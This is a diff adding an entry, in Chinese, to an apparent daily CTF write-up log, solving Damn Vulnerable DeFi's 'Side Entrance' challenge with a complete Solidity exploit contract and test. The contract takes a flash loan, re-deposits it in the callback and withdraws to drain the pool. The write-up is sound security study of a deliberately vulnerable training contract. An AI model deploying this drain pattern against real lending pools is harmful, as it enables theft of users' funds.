@@ -1158,4 +1158,51 @@ contract Exploit {
 - [DamnVulnerableDeFi-03-Truster.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-03-Truster.t.sol)
 
 
+### 2024.09.16
+
+- 繼續進行每日解一題挑戰
+
+#### [DamnVulnerableDeFi-04] Side Entrance
+
+- 過關條件: 把 `SideEntranceLenderPool` 合約持有的 1000 顆 ETH 偷走，轉到 recovery 帳號
+- 解法:
+  - 這題有點水，直接講解法
+  - 我們只要發起 `flashLoan()` 呼叫
+  - 在 `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();` 的 callback context 中，呼叫 `deposit()` 把閃電貸借款直接存進去
+  - 因為 `SideEntranceLenderPool` 只是單純的檢查 `flashLoan()` 前與後的 balance，所以利用這種方式就可以讓我們憑空增加 `balances[msg.sender]`
+  - 最後再呼叫 `withdraw()` 把 `SideEntranceLenderPool` 合約的 ETH 幹走即可
+
+```solidity
+function test_sideEntrance() public checkSolvedByPlayer {
+    Exploit exp = new Exploit(pool, ETHER_IN_POOL);
+    exp.start();
+    payable(recovery).transfer(ETHER_IN_POOL);
+}
+
+contract Exploit {
+    SideEntranceLenderPool pool;
+    uint256 ETHER_IN_POOL;
+
+    constructor(SideEntranceLenderPool _pool, uint256 _ETHER_IN_POOL) {
+        pool = _pool;
+        ETHER_IN_POOL = _ETHER_IN_POOL;
+    }
+    
+    function start() external {
+        pool.flashLoan(ETHER_IN_POOL);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
+```
+
+- [DamnVulnerableDeFi-04-SideEntrance.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-04-SideEntrance.t.sol)
+
+
 <!-- Content_END -->
